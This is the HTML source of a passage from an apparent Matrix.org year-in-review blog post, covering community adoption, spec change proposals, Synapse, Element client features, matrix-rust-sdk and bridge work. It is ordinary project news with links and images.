&lt;p&gt;Another big step change has been the number of existing chat providers looking to become part of the wider Matrix network. Back in September our friends at &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=jBtBiUXLqAk&amp;amp;t=1691s&quot;&gt;Rocket.Chat announced that they’re working on Matrix support&lt;&#x2F;a&gt; for federation, perhaps inspired by our case study in making &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;07&#x2F;gitter-now-speaks-matrix&quot;&gt;Gitter speak Matrix&lt;&#x2F;a&gt; - and meanwhile Matrix comes up a lot in the context of Twitter’s Bluesky initiative, and a few big players we can’t yet mention have also been in touch wanting to natively talk Matrix too.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve also seen a huge shift in big enterprises adopting Matrix for self-sovereign secure communication (although we can’t drop any names yet 😔). This may have been spurred on by such misadventures as Electronic Arts being compromised via a &lt;a href=&quot;https:&#x2F;&#x2F;www.vice.com&#x2F;en&#x2F;article&#x2F;7kvkqb&#x2F;how-ea-games-was-hacked-slack&quot;&gt;leaked Slack access token&lt;&#x2F;a&gt;, but it feels like many of the biggest organisations now realise that unquestioningly handing their data to Slack or Teams is a bad idea, when they could have an end-to-end encrypted deployment of their own instead.&lt;&#x2F;p&gt;
&lt;p&gt;There has also been a turning point in legislation in favour of Matrix - with the EU Digital Markets Act &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1471191916838633481&quot;&gt;pushing hard for interoperability&lt;&#x2F;a&gt; for ‘big tech’ communication services in the EU (see &lt;a href=&quot;https:&#x2F;&#x2F;interoperability.news&#x2F;2021&#x2F;12&#x2F;eu-parliament-upgrades-dma-to-open-gatekeepers-gates&#x2F;&quot;&gt;Amandine’s take&lt;&#x2F;a&gt; here), and meanwhile Eric Migicovsky, CEO at &lt;a href=&quot;https:&#x2F;&#x2F;www.beeper.com&#x2F;&quot;&gt;Beeper&lt;&#x2F;a&gt; has been busy &lt;a href=&quot;https:&#x2F;&#x2F;www.c-span.org&#x2F;video&#x2F;?c4992173&#x2F;user-clip-eric-migicovsky-testimony&quot;&gt;testifying to US Congress&lt;&#x2F;a&gt; on the merits of interoperability too. It’s not inconceivable that we will soon live in a world where governments mandate that the walled gardens will finally have to open up, and we may see a whole new level of interest in communication providers wanting to join Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;Communities themselves have also been embracing Matrix more and more over the last year: we were incredibly proud to host &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;02&#x2F;15&#x2F;how-we-hosted-fosdem-2021-on-matrix&quot;&gt;FOSDEM 2021&lt;&#x2F;a&gt;, the world’s biggest open source conference via Matrix (all 35K attendees!) - and we’re gearing up to do it again in February for &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;fosdem&#x2F;status&#x2F;1451475324684980241&quot;&gt;FOSDEM 2022&lt;&#x2F;a&gt; (this time with our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;02&#x2F;call-for-participation-for-the-fosdem-2022-matrix-dev-room&quot;&gt;very first FOSDEM Matrix dev room&lt;&#x2F;a&gt;!). We were also really glad that &lt;a href=&quot;https:&#x2F;&#x2F;libera.chat&#x2F;&quot;&gt;Libera.chat&lt;&#x2F;a&gt; let us point a dedicated homeserver and IRC bridge at their new IRC network (meaning you can join anywhere on Libera from Matrix as #channel:libera.chat, and talk to anyone as @nick:libera.chat). High profile open source projects have been adopting Matrix all over the place - &lt;a href=&quot;https:&#x2F;&#x2F;wiki.debian.org&#x2F;Teams&#x2F;DebianSocial&#x2F;Matrix&quot;&gt;Debian&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;fedoramagazine.org&#x2F;multiple-matrix-sessions-with-element-on-fedora-linux&#x2F;&quot;&gt;Fedora&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;nixos.wiki&#x2F;wiki&#x2F;Matrix&quot;&gt;NixOS&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;wiki.archlinux.org&#x2F;title&#x2F;Matrix&quot;&gt;Arch&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;blog.torproject.org&#x2F;entering-the-matrix&#x2F;&quot;&gt;Tor&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;ansible.github.io&#x2F;community&#x2F;posts&#x2F;matrix_and_ansible.html&quot;&gt;Ansible&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;whatwg.org&#x2F;chat&quot;&gt;WHATWG&lt;&#x2F;a&gt; and many others (check out &lt;a href=&quot;https:&#x2F;&#x2F;www.ubuntubuzz.com&#x2F;2021&#x2F;10&#x2F;matrix-chat-adoption-by-community-in.html&quot;&gt;this list&lt;&#x2F;a&gt;!) now have their own Matrix servers and spaces.  (You know things are busy when we haven’t had time to do a big blog post to announce folk as important as these joining the network!)&lt;&#x2F;p&gt;
&lt;p&gt;Finally, there has been an explosion of new projects and milestones in the wider community - &lt;a href=&quot;https:&#x2F;&#x2F;conduit.rs&quot;&gt;Conduit&lt;&#x2F;a&gt; entered &lt;a href=&quot;https:&#x2F;&#x2F;conduit.rs&#x2F;release-0-2-0&#x2F;&quot;&gt;beta&lt;&#x2F;a&gt; as a super exciting lightweight Rust homeserver implementation; &lt;a href=&quot;https:&#x2F;&#x2F;fluffychat.im&quot;&gt;FluffyChat&lt;&#x2F;a&gt; hit 1.0 with an impressively polished Flutter-based experience; &lt;a href=&quot;https:&#x2F;&#x2F;beeper.com&quot;&gt;Beeper&lt;&#x2F;a&gt; pre-launched to huge amounts of mainstream excitement; &lt;a href=&quot;https:&#x2F;&#x2F;cinny.in&#x2F;&quot;&gt;Cinny&lt;&#x2F;a&gt; exploded out of the blue as an incredibly elegant next-generation web client; &lt;a href=&quot;https:&#x2F;&#x2F;keanu.im&#x2F;&quot;&gt;Keanu&lt;&#x2F;a&gt; materialised from &lt;a href=&quot;https:&#x2F;&#x2F;guardianproject.info&#x2F;&quot;&gt;The Guardian Project&lt;&#x2F;a&gt; as their glossy Matrix client suite; &lt;a href=&quot;https:&#x2F;&#x2F;commune.chat&#x2F;&quot;&gt;Commune&lt;&#x2F;a&gt; appeared as a hybrid messageboard&#x2F;chatroom interface; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Nheko-Reborn&#x2F;nheko&#x2F;&quot;&gt;Nheko&lt;&#x2F;a&gt; has matured significantly with huge E2EE improvements and feature and VoIP polish; &lt;a href=&quot;https:&#x2F;&#x2F;apps.kde.org&#x2F;en-gb&#x2F;neochat&#x2F;&quot;&gt;NeoChat&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;quotient-im&#x2F;libQuotient&quot;&gt;libQuotient&lt;&#x2F;a&gt; development is progressing solidly; &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.gnome.org&#x2F;GNOME&#x2F;fractal&quot;&gt;Fractal&lt;&#x2F;a&gt; is busy with the &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.gnome.org&#x2F;GNOME&#x2F;fractal&#x2F;-&#x2F;tree&#x2F;fractal-next&quot;&gt;fractal-next&lt;&#x2F;a&gt; rewrite to move everything over to matrix-rust-sdk and GTK 4;  &lt;a href=&quot;https:&#x2F;&#x2F;syphon.org&#x2F;&quot;&gt;Syphon&lt;&#x2F;a&gt; continues to forge ahead as a privacy-focused Flutter-based client, and non-chat clients like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;toger5&#x2F;TheBoard&quot;&gt;The Board&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;opentower&#x2F;populus-viewer&quot;&gt;Populus&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;DanilaFe&#x2F;matrix-highlight&quot;&gt;Matrix Highlight&lt;&#x2F;a&gt; have started to appear in earnest too!  We also had a super successful &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;05&#x2F;20&#x2F;google-summer-of-code-2021&quot;&gt;Google Summer of Code&lt;&#x2F;a&gt; this year, with a record number of 7 students participating in both core team and community projects.&lt;&#x2F;p&gt;
&lt;p&gt;Please note this is just a random sample of all the community news over the last year - to get more colour on what’s been going on, we highly recommend flipping through the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&quot;&gt;This Week In Matrix archives&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-matrix-spec&quot;&gt;The Matrix Spec&lt;&#x2F;h2&gt;
&lt;p&gt;The Matrix spec is the single source of truth of what Matrix actually is, and this year it got some major improvements thanks to a beautiful new website at &lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&quot;&gt;https:&#x2F;&#x2F;spec.matrix.org&lt;&#x2F;a&gt; thanks to Will Bamberg, formerly of &lt;a href=&quot;https:&#x2F;&#x2F;developer.mozilla.org&#x2F;&quot;&gt;MDN&lt;&#x2F;a&gt; (and who’s now back fighting the good fight with the MDN team at &lt;a href=&quot;https:&#x2F;&#x2F;opencollective.com&#x2F;open-web-docs&#x2F;updates&#x2F;will-bamberg-joins-open-web-docs-staff&quot;&gt;OWD&lt;&#x2F;a&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;Aside from the new spec site, we also released our first official point release in a while - &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;11&#x2F;09&#x2F;matrix-v-1-1-release&quot;&gt;Matrix 1.1&lt;&#x2F;a&gt;, and we’re going to aim to keep regular releases happening once a quarter from here on in.  It’s also worth noting that it’s very much a feature and not a bug that spec releases lag behind the various &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;proposals&quot;&gt;spec proposals&lt;&#x2F;a&gt; which fly around as the core team and community experiment with new features like spaces, threads, etc.  We very deliberately only merge change proposals to the spec which have been proven to work in real life implementations, and which have fully passed the spec review process (along with any dependencies they might have!).&lt;&#x2F;p&gt;
&lt;p&gt;Talking of which, in 2021 we saw a record &lt;strong&gt;109&lt;&#x2F;strong&gt; Matrix Spec Change proposals (MSCs) created. Even better, we closed &lt;strong&gt;62&lt;&#x2F;strong&gt; MSCs - so while the backlog is still growing, we’re still making very concrete progress.  Of the 109 new MSCs: 34 were from the wider Matrix community, 34 were from ex-community contributors who are now part of the core team, 13 were from the founding Matrix team, and 28 were from folks hired to work on Matrix by Element on behalf of the Matrix.org Foundation.  This feels like a pretty healthy blend of contributions, and while it’s true that spec work could always progress faster, things do seem to be heading in the right direction.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-spec.png&quot; alt=&quot;The latest MSC stats&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the new year, the Spec Core Team (responsible for reviewing MSCs and voting on what gets merged to the spec) is going to make a concerted effort to carve out more dedicated time for spec work - thankfully one of the side-effects of Matrix growing is that there are now a lot more people around with whom we can share other work, hopefully meaning that we can put significantly more hours into keeping the spec growing healthily.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;synapse&quot;&gt;Synapse&lt;&#x2F;h2&gt;
&lt;p&gt;Synapse is the primary homeserver implementation published by the Matrix core team, and its maturity is unrecognisable from where we were a year ago.  One of the big breakthroughs has been stabilising memory usage through caching improvements - the Matrix.org synapse now reliably only uses 2-3GB of RAM on its main process, despite its activity having more than doubled over the last year (up from 513K monthly active users to 1.11M!).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-perf.jpg&quot; alt=&quot;Synapse memory performance fixes&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Further signs of maturity include Synapse’s radically improved new &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;latest&#x2F;&quot;&gt;documentation&lt;&#x2F;a&gt; and the new &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;synapse&#x2F;latest&#x2F;modules&#x2F;index.html&quot;&gt;module API&lt;&#x2F;a&gt;, the fact that mypy type-safety coverage has improved from ~75% to over 89.7% (across 151,903 lines of code!), and the fact that Open Tracing support has matured to the point that visualising complex cross-worker behaviour is nowadays a genuine pleasure.  Frankly, Synapse should be feeling robust and stable these days - if you see folks claiming otherwise, please check they’re not basing that on outdated info (or failing that, get them to file bug reports that we can jump on!).&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, on the feature side, we’ve landed a huge spate of long-awaited core functionality.  Probably the best way to track it is by the Matrix Spec Change proposals (MSCs) which have been implemented (although I dare you to also go and check out Synapse’s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;develop&#x2F;CHANGES.md&quot;&gt;changelog&lt;&#x2F;a&gt;, all 675KB of it, which is frankly a thing of beauty and will take you down a rabbithole all the way back to v0.0.0 in Aug 2014 if you so desire ;P). Major MSCs which we’ve landed include:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Spaces! It’s hard to overstate how positive this has been for Matrix’s usability: at last, we can group our rooms together however we please, both for our own edification and to share with others - and we can view space hierarchies over federation, complete with pagination (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2946&quot;&gt;MSC2946&lt;&#x2F;a&gt;) as well as specify who can join a room based on whether they’re a member of a given space&#x2F;room (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3083&quot;&gt;MSC3083&lt;&#x2F;a&gt;).&lt;&#x2F;li&gt;
&lt;li&gt;Threads! Yes, that’s right - coming any day now to a Matrix client close to you, we have ‘classic’ threaded messaging landing, providing sidebars of conversation through the new m.thread relation type (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3440&quot;&gt;MSC3440&lt;&#x2F;a&gt;), building on Matrix’s existing aggregation API as used for edits and reactions.  We’ve chosen to prioritise single-level-deep-threads rather than arbitrarily-deep-trees (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2836&quot;&gt;MSC2836&lt;&#x2F;a&gt;) as it maps more easily to a chat UX, although the two approaches are not mutually exclusive.&lt;&#x2F;li&gt;
&lt;li&gt;Aggregations! Everyone’s favourite bête noire in Matrix tends to be that aggregations for edits &amp;amp; reactions predate today’s Matrix Spec Change process and went mainstream without using a vendor prefix before their spec had been stabilised.  Better late than never, we’ve taken advantage of Threads to go back and fix what once went wrong - and now &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2674&quot;&gt;MSC2674&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2675&quot;&gt;MSC2675&lt;&#x2F;a&gt; and friends are hopefully on a much better track to provide a basis for how aggregations work - both in the spec and in the reference implementation in Synapse.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-aggs.png&quot; alt=&quot;Anatomy of a bête noire&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Social Login via multiple SSO providers (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2858&quot;&gt;MSC2858&lt;&#x2F;a&gt;) - almost 50% of new registrations on the Matrix.org homeserver now use social login!  Interestingly the split of SSO usage is roughly 70% Google, 12% GitHub, 11% Apple, 6% Facebook and 1% GitLab. Make of that what you will!&lt;&#x2F;li&gt;
&lt;li&gt;Knocking (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2403&quot;&gt;MSC2403&lt;&#x2F;a&gt;)! Huge thanks to Sorunome and Anoa, we now support the ability to knock to ask to join a room if not yet invited. If this sounds unfamiliar, it may be because it hasn’t landed in Element yet, but expect it to land next year.&lt;&#x2F;li&gt;
&lt;li&gt;Refresh tokens (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2918&quot;&gt;MSC2918&lt;&#x2F;a&gt;)! At last, we have a standard way for clients to refresh their access tokens, so that if your access token leaks it will not give access to your account indefinitely.  (This also has yet to land in Element, but has been proved on a branch on Hydrogen).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Finally, last but not least, Eric from Gitter has been fearlessly hacking his way through some of Matrix’s gnarliest problems in his quest to bring Matrix+Element up to full feature parity with Gitter. In practice, this means adding the ability to incrementally import old history into existing Matrix rooms (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716&quot;&gt;MSC2716&lt;&#x2F;a&gt;), so we can expose the vast amounts of knowledge in Gitter’s archives directly into Matrix - and in future provide bridging in general of existing archives (Slack, Discord, mailing lists, newsgroups, forums, etc.) into Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;This is a &lt;em&gt;tough&lt;&#x2F;em&gt; problem, as Matrix rooms are fundamentally immutable - events sent into a room cannot be changed.  However, we can bend time a bit and add old chapters of history to the room as if we’d just discovered them down the back of the sofa - and this is what &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716&quot;&gt;MSC2716&lt;&#x2F;a&gt; does.  The (rewritten!) &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;%5BMSC2716%5D(https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716)&#x2F;proposals&#x2F;2716-batch-send-historical-messages.md&quot;&gt;spec proposal&lt;&#x2F;a&gt; is a thing of beauty and well worth a look, and you can see an early preview in action back on &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;gSrqj2IzJew?t=529&quot;&gt;Matrix Live in June&lt;&#x2F;a&gt;. Over the last few months it’s been merging and maturing in Synapse and we should see it in the wild in the near future!  And for bonus points Eric’s also just added in Jump-to-date support (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3030&quot;&gt;MSC3030&lt;&#x2F;a&gt;), letting clients jump around room history by timestamp - another Gitter feature that we sorely need, and will also help us publish excellent Gitter-style online chat archives in future.  You can see it in action in last week’s &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Hsyqa5ozWIo?t=581&quot;&gt;Matrix Live&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;element&quot;&gt;Element&lt;&#x2F;h2&gt;
&lt;p&gt;Meanwhile, on the client side, Element continues to act as a flagship client to drive the development of the official client SDKs we ship as the Matrix.org Foundation - and our focus more than ever before has been to ensure that Matrix can be used to create mainstream-usable polished glossy apps.  After all, Matrix will only succeed if clients emerge which can punch their weight against the enormous incumbents - be they Slack, Teams, WhatsApp or Discord.&lt;&#x2F;p&gt;
&lt;p&gt;This year, improving UX quality has been front and center - and hopefully the shift has been obvious in the app (and huge thanks to everyone who tweeted&#x2F;tooted&#x2F;enthused about improvements when they saw them!).  Part of this has been ensuring that all new features are built in a design- and product-led fashion by folks who are explicitly focused on product engineering - with product design involved from the outset and with coordination and focus provided by product management folks. This is far from the typical way that FOSS operates, but if we’re to succeed against the incumbents we have to beat them at their own game (just as, for instance, Mozilla wields conventional product management in their browser wars).&lt;&#x2F;p&gt;
&lt;p&gt;More recently, there’s also been a major shift towards structured &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;element_hq&#x2F;status&#x2F;1470798993122807809&quot;&gt;user testing&lt;&#x2F;a&gt; in order to evaluate new features and analyse how users trip over the app in general, including radically improved analytics (for those who opt in!) to help visualise which bits of the app aren’t working.  In the new year, the expectation is to double down on user testing: quite simply, if you can hand Element to a casual mainstream user and they can get the core jobs done (sign up, chat to someone, call someone, etc.) without tripping over, then mission successful :)&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;&quot;&gt;Element blog&lt;&#x2F;a&gt; covers the work this year from the Element side, but from the Matrix side, the key changes include:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;finalising &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;spaces-blast-out-of-beta&#x2F;&quot;&gt;Spaces&lt;&#x2F;a&gt; as a way to group together rooms - providing the equivalent of Discord servers or Slack workspaces, or alternatively letting you gather your own rooms together into a private space.&lt;&#x2F;li&gt;
&lt;li&gt;building out Threads (available in labs; launching soon!)&lt;&#x2F;li&gt;
&lt;li&gt;Social Login!&lt;&#x2F;li&gt;
&lt;li&gt;radically improving Element’s Information Architecture (i.e. the layout of the UI, so that the panels and buttons are correctly semantically grouped together in a visual hierarchy)&lt;&#x2F;li&gt;
&lt;li&gt;adding &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;introducing-voice-messages-and-so-much-more&#x2F;&quot;&gt;Voice Messages&lt;&#x2F;a&gt; as a really beautiful polished feature powered by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3245&quot;&gt;MSC3245&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;adding Location Share (available in labs; launching soon!) powered by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3488&quot;&gt;MSC3488&lt;&#x2F;a&gt; (and in future &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3489&quot;&gt;MSC3489&lt;&#x2F;a&gt; for live-location sharing - in dev on iOS right now!)&lt;&#x2F;li&gt;
&lt;li&gt;adding &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;element-1-9-1-export-is-finally-here&#x2F;&quot;&gt;Chat Export&lt;&#x2F;a&gt;, thanks to the amazing GSOC work by Jaiwanth &lt;&#x2F;li&gt;
&lt;li&gt;adding Polls via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3381&quot;&gt;MSC3381&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2021-12-22-spaces.gif&quot; alt=&quot;Spaces in all their glory&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;From a spec perspective, it’s been particularly exciting to be finally using Extensible Events (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1767&quot;&gt;MSC1767&lt;&#x2F;a&gt;) for many of these new features: voice messages, location sharing and polls are all experimenting with this new idiom for expressing richer structured data over Matrix while presenting a consistent and useful ‘fallback’ representation for clients which don’t know how to natively render the richer data.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve also done a huge amount of work this year in improving 1:1 VoIP - both via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2746&quot;&gt;MSC2746&lt;&#x2F;a&gt; and within the JS, iOS &amp;amp; Android Matrix SDKs. If you haven’t tried doing a 1:1 call via Matrix recently we’d highly recommend giving it a go - probably the main remaining bug at this point is that we need to find a better default ringtone for Element(!). Huge thanks go to Šimon Brandner both for his community contributions to VoIP and across all of Element Web - including proper screensharing for 1:1 (and group!) VoIP calls. This has also laid excellent groundwork for native Group VoIP&#x2F;Video over Matrix - more on that later.&lt;&#x2F;p&gt;
&lt;p&gt;On Element Mobile, work on all the above features has been balanced by fighting against the various platform’s quirks, and lots of under-the-hood work improving performance. iOS has gone through a long journey to get back to stability after iOS’s push notification API changes, while also improving incremental sync performance by rearchitecting the local cache in the client.  Android meanwhile has been working away improving the app; reworking Notifications, migrating to Kotlin coroutines and Hilt, and closing over 690 GH issues.  Android has also had its fair &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;element-on-google-play-store&#x2F;&quot;&gt;share of dramas&lt;&#x2F;a&gt;, including some recent long Play Store review times, but we’ve come through the other side intact.&lt;&#x2F;p&gt;
&lt;p&gt;However, we’ve been thinking more and more about the nightmarish pain point that is the amount of time we spend implementing the same features across the three different platforms. This becomes particularly apparent for security-sensitive features such as end-to-end encryption, or major API changes such as aggregations, spaces or sync v3 (more on that later). Or simply rapidly sharing improvements to implementation best practices between platforms.&lt;&#x2F;p&gt;
&lt;p&gt;Historically we consciously built platform-native Matrix SDKs in order to provide entirely idiomatic SDKs for other Matrix developers to use - and also to better dogfood the protocol and ensure that the heterogenous implementations could interoperate successfully. However, in practice, relatively few third party projects other than Element build on top of matrix-ios-sdk and matrix-android-sdk2 - and meanwhile there are more than enough other Matrix clients out there nowadays to dogfood interoperability against (including alternative experimental clients from the core team such as Hydrogen).&lt;&#x2F;p&gt;
&lt;p&gt;So, we’ve been thinking increasingly seriously about how to solve this…&lt;&#x2F;p&gt;
&lt;h2 id=&quot;a-new-hope-matrix-rust-sdk&quot;&gt;A new hope: matrix-rust-sdk&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&quot;&gt;matrix-rust-sdk&lt;&#x2F;a&gt; is an attempt to build a new reference client SDK for Matrix which can be used by as many platforms as possible - hopefully forever stopping us from reimplementing the wheel more than we need to. Work began towards the end of 2019, building on top of &lt;a href=&quot;https:&#x2F;&#x2F;www.ruma.io&#x2F;&quot;&gt;Ruma&lt;&#x2F;a&gt;’s excellent Matrix rust crates, and poljar has been working away solidly at it ever since.  We teased matrix-rust-sdk in last year’s update, but as of this year it is properly coming of age and we’ve started using it in earnest - beginning by swapping out Element Android’s encryption implementation for matrix-rust-sdk-crypto (the E2EE cryptography crate provided by the SDK).&lt;&#x2F;p&gt;
&lt;p&gt;If you’re not familiar with Rust, the main benefits we get here are a heavy emphasis on safety and security without compromising performance; while providing a single codebase which can be used equally from iOS, native Desktop apps such as Fractal, Android (with native bindings) and even Web (via WASM, in future).  While technically this results in a “non-native” SDK relative to matrix-js-sdk, matrix-ios-sdk and matrix-android-sdk - in practice, it’s become so common to depend on native-code shared libraries (outside the web, at least) that it’s not really a problem.&lt;&#x2F;p&gt;
&lt;p&gt;Initial results look wildly promising here: “Element R” (formerly known as Corroded Element - the codename for the Rust-enhanced version of Element Android) builds are now out there, and out-perform the kotlin E2EE implementation by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;pull&#x2F;170&quot;&gt;roughly 10x&lt;&#x2F;a&gt;, thanks to using native code and Rust’s improved parallelisation.&lt;&#x2F;p&gt;
&lt;p&gt;Our next step is to start using it on iOS, and we’ll be experimenting with a next-generation of Element iOS shortly in the new year with the SDK provided exclusively by matrix-rust-sdk.  Element will also be funding more people to work fulltime on matrix-rust-sdk itself, and to see what the developer experience is like when you use it seriously on the Web - watch this space!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;bridges-bots-widgets-and-integration-managers&quot;&gt;Bridges, Bots, Widgets and Integration Managers&lt;&#x2F;h2&gt;
&lt;p&gt;Elsewhere in Matrix, the Bridge Crew has busy polishing bridges like crazy - working away on encrypted application services (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3202&quot;&gt;MSC3202&lt;&#x2F;a&gt;), massively improving the IRC bridge (particularly in the fallout of the great Freenode-&amp;gt;Libera migration), stabilising and extending &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-bifrost&quot;&gt;matrix-bifrost&lt;&#x2F;a&gt; (our XMPP-and-more bridge), getting libpurple bridging working properly in bifrost, getting &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-slack&quot;&gt;matrix-appservice-slack&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&#x2F;matrix-appservice-discord&quot;&gt;matrix-appservice-discord&lt;&#x2F;a&gt; stable enough to be hosted by &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;slack-bridging&#x2F;&quot;&gt;EMS&lt;&#x2F;a&gt;, experimenting with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;turt2live&#x2F;matrix-bot-sdk&quot;&gt;matrix-bot-sdk&lt;&#x2F;a&gt; as an alternative bridging API, and even looking at adding &lt;a 